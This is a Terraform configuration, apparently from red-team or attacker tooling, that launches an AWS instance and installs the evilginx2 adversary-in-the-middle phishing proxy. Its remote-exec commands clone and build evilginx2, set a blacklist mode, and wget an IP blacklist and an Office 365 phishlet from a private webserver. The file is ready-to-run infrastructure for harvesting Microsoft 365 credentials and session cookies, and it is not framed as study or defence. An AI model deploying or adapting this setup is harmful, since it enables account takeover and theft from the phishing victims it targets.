resource "aws_instance" "evilginx" {
  ami = var.ami
  # count                  = 3
  instance_type          = var.instance_type
  key_name               = var.key_name
  vpc_security_group_ids = var.security_group_id
  root_block_device {
    volume_size = "32"
  }

  tags = {
    Name = "${var.name}"
  }

  connection {
    type        = "ssh"
    user        = "admin"
    private_key = file("./keys/<private-key>")
    host        = self.private_ip
  }

  provisioner "remote-exec" {
    inline = [
      "sleep 30",
      ## install evilginx
      "cd /opt",
      "sudo apt install golang git make -y",
      "sudo git clone https://github.com/kgretzky/evilginx2.git",
      "cd /opt/evilginx2/",
      "sudo make",
      "sudo make install",
      ## modify evilginx
      "sudo mkdir /root/.evilginx/",
      "sudo echo \"blacklist_mode: unauth\" >> /tmp/config.yaml",
      "sudo echo \"ip: ${aws_instance.evilginx.public_ip}\" >> /tmp/config.yaml",
      "sudo mv /tmp/config.yaml /root/.evilginx/config.yaml",
      "sudo wget 'http://<private-webserver>/ip-blacklist.txt' -O '/root/.evilginx/blacklist.txt'",
      "sudo wget 'http://<private-webserver>/o365-managed.yaml' -O '/usr/share/evilginx/phishlets/o365-managed.yaml'"
      ]
  }
}
